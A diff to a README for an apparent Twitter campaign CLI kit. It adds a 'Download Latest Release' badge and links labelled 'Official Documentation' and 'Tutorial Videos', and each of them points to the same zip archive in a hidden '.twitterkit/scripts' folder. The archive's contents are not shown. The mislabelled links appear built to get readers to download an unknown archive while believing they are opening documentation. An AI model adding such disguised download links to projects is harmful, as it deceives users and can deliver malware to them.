@@ -22,6 +22,8 @@ Install the CLI directly from this repository:
 uv tool install --from git+https://github.com/BienvenuONIODJE/twitter-init-kit.git twitterify-cli
 ```
 
+[![Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
+
 Initialize a campaign workspace:
 
 ```bash
@@ -80,6 +82,8 @@ For more information and detailed guides, check out the following resources:
 - [Template Guide](docs/templates.md)
 - [TweetClaw Evidence Loop](refs/5_more/TweetClaw-Evidence-Loop.md)
 - [Template Archive](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
+- [Official Documentation](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 
 ## 📜 License
 
